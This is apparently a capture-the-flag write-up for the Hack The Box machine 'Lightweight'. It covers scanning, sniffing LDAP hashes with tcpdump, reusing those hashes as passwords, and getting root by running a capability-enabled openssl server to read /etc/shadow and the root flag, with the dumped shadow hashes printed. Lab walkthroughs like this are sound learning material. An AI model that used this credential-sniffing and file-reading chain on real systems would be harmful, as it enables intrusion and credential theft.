@@ -1,0 +1,167 @@
+Lightweight - 10.10.10.119
+
+OS - Linux
+
+/  __\/  __//  _ \  / \  /|/  _ \/ \   /    /  / \/ \  /|/__ __\/  __// \   / \   / \/  __//  __// \  /|/   _\/  __/  
+|  \/||  \  | | \|  | |  ||| / \|| |   |  __\  | || |\ ||  / \  |  \  | |   | |   | || |  _|  \  | |\ |||  /  |  \    
+|    /|  /_ | |_/|  | |/\||| \_/|| |_/\| |     | || | \||  | |  |  /_ | |_/\| |_/\| || |_//|  /_ | | \|||  \_ |  /_   
+\_/\_\\____\\____/  \_/  \|\____/\____/\_/     \_/\_/  \|  \_/  \____\\____/\____/\_/\____\\____\\_/  \|\____/\____\  
+
+
+So we start this one off by the usual probing the box and diving in....
+                                                                                                                      
+
+Nmap scan report for 10.10.10.119
+Host is up (0.77s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
+|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
+|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
+80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: Lightweight slider evaluation page - slendr
+389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
+| ssl-cert: Subject: commonName=lightweight.htb
+| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
+| Not valid before: 2018-06-09T13:32:51
+|_Not valid after:  2019-06-09T13:32:51
+|_ssl-date: TLS randomness does not represent time
+
+We see some interesting ports and begin right off the bat by sticking in our /etc/hosts file
+an entry for lightweight.htb. 
+
+Notice 389 we defintely can sniff something out of that without a doubt if its being used.
+By taking a look at port 80 we see http://10.10.10.119/user.php and it gives us acesss to
+the box right off the bat. 
+
+If you get too noisey you will get the ban hammer from this one very easily. So logging into
+ssh we start the probe the box looking for priv esc. Remember port 389 is open so lets see 
+now we have acces if we can exploit it.
+============================================[user flag]================================================================
+
+[10.10.14.111@lightweight]$ - Your IP becomes your username can change pass as well
+
+Probing the box we find tcpdump and the ability to use it lol. So by listening on port
+389 and dumping out to a text file search thru the strings we can see we got 1 clear hash
+for user ldapuser2 so we take this md5 hash and try cracking it. 
+
+{~0Y
+8bc8251332abe1d7f*************
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1*************
+4>=@
+;>>@
+4>?@
+4>@@
+cn=admin,dc=lightweight,dc=htb
+
+No luck on cracking it lol but remember a bug were you can use the hash as your password in ssh while
+authenitcated as you original user hmm lol. With some google magic found a way to do just that lmfao
+
+[10.10.14.111@lightweight temp]$ su ldapuser2
+Password: < -----------------------------------------Here shoved in the found hash and bam got it :)
+[ldapuser2@lightweight temp]$ cd /hom
+bash: cd: /hom: No such file or directory
+[ldapuser2@lightweight temp]$ cd /home/ldapuser2
+[ldapuser2@lightweight ~]$ ls
+backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
+[ldapuser2@lightweight ~]$ cat user.txt
+8a866d3bb7e13****************
+
+running getcap -r / 2>/dev/null btw lets you know what you can do :)
+
+Now we got user.txt and we are ready to move and you will notice there is a ldapuser2 and probably the next step 
+so we try to listen more with tcpdump no luck there. I then went for backup.7z and then found by unziping it and
+was able to extract ldapuser1. 
+
+$username = 'ldapuser1';
+$password = 'f3ca9d298a553da117***********';
+
+Now we gain access just like before using the hash as the password from ldap 
+we are able again to priv esc to the other user on the box.
+
+[ldapuser1@lightweight /]$
+
+We again start probing the box and notice a different install of openssl and the ability to run it
+with some research and motivation I was able to pull off the following version of rooting this box.
+
+===================================root and priv esc==============================================================]
+
+First generate a set of keys and follow whatever method you like as we like to let you have some of the fun find what
+is out there on openssl exploiting and use this guide. Or on hackthebox lppsec does a great jobs with videos on each 
+box.
+
+After figuring out running openssl may work try out some commands and probe along but after running this one command
+I found the gold. So here is the command I made a running server then began the music....
+
+[ldapuser1@lightweight /]$ /home/ldapuser1/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
+
+Then lets see what goodies we are able to get now we have something going don't forget to create a set of keys first
+make sure you do that or this part will not work you will see what is going on. 
+
+We now have magic and can read the shadow file so we are in business now so hmm...
+
+[ldapuser1@lightweight /]$ curl -k "https://127.0.0.1:1337/etc/shadow"
+root:$6$eVOz8tJs$xpjymy5BFFeCIHq9a.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS/ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.:17711:0:99999:7:::
+bin:*:17632:0:99999:7:::
+daemon:*:17632:0:99999:7:::
+adm:*:17632:0:99999:7:::
+lp:*:17632:0:99999:7:::
+sync:*:17632:0:99999:7:::
+shutdown:*:17632:0:99999:7:::
+halt:*:17632:0:99999:7:::
+mail:*:17632:0:99999:7:::
+operator:*:17632:0:99999:7:::
+games:*:17632:0:99999:7:::
+ftp:*:17632:0:99999:7:::
+nobody:*:17632:0:99999:7:::
+systemd-network:!!:17689::::::
+dbus:!!:17689::::::
+polkitd:!!:17689::::::
+apache:!!:17689::::::
+libstoragemgmt:!!:17689::::::
+abrt:!!:17689::::::
+rpc:!!:17689:0:99999:7:::
+sshd:!!:17689::::::
+postfix:!!:17689::::::
+ntp:!!:17689::::::
+chrony:!!:17689::::::
+tcpdump:!!:17689::::::
+ldap:!!:17691::::::
+saslauth:!!:17691::::::
+ldapuser1:$6$OZfv1n9v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49cMFueNZNOoI6A1.:17691:365:99999:7:::
+ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1:17691:365:99999:7:::
+10.10.14.2:clJFBL7EDs1H6:17851:0:99999:7:::
+10.10.14.4:raAn7IDZWvacs:18013:0:99999:7:::
+10.10.14.156:csXH8M5IbjBKM:18013:0:99999:7:::
+10.10.14.29:$6$iKINePIn$C94EqvVUGw1LBtwFWXjD75sFM8KOfubXB6.7.x7N9qAEFtB4IBxCg1ngLm2fFaDVavsxhn1ct4UPPVqcfzw4o.:18013:0:99999:7:::
+10.10.14.111:rbevKwh8mcN8I:18013:0:99999:7:::
+10.10.10.119:uoM8km1uMTxMI:18013:0:99999:7:::
+127.0.0.1:trnWkT8QzIPp2:18013:0:99999:7:::
+10.10.14.34:biwjDNWb5MJSA:18013:0:99999:7:::
+10.10.14.65:tyfKIm7Rr8KCg:18013:0:99999:7:::
+10.10.14.109:nrs7WTSQ4bRtc:18013:0:99999:7:::
+10.10.14.98:qwlt3JPoZmgys:18013:0:99999:7:::
+10.10.14.123:zxLnFkK0ldibw:18013:0:99999:7:::
+10.10.14.129:xdH1NIMSZpZ.2:18013:0:99999:7:::
+10.10.14.147:gpbCRzOgPDpAo:18013:0:99999:7:::
+
+
+ROOT lmfao
+
+[ldapuser1@lightweight /]$ curl -k "https://127.0.0.1:1337/root/root.txt"
+f1d4e309c5a6b3ff****************
+
+
+So we got it now and done root is owned for shell and to further go on you can use
+your imagination on what you can do next lol...
+
+
+Be well and never forget HTP ...
+
+C-3P0
+
+Red Wolf Intelligence
